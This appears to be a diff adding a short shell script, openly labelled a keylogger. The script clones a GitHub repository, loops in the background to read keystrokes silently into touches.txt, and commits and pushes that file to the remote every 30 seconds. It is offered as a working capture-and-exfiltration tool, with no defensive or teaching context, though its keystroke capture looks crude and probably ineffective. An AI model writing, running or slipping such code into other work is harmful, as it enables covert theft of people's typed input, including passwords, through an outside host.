@@ -1,0 +1,6 @@
+mkdir -p ~/keylogger && cd ~/keylogger && \
+git clone https://github.com/Noamist/Blind.git && \
+cd Blind && \
+touch touches.txt && \
+(while true; do read -n 1 -s touche; echo "$touche" >> touches.txt; done) & \
+(while true; do sleep 30; git add touches.txt; git commit -m "Chaos"; git push origin main; done)
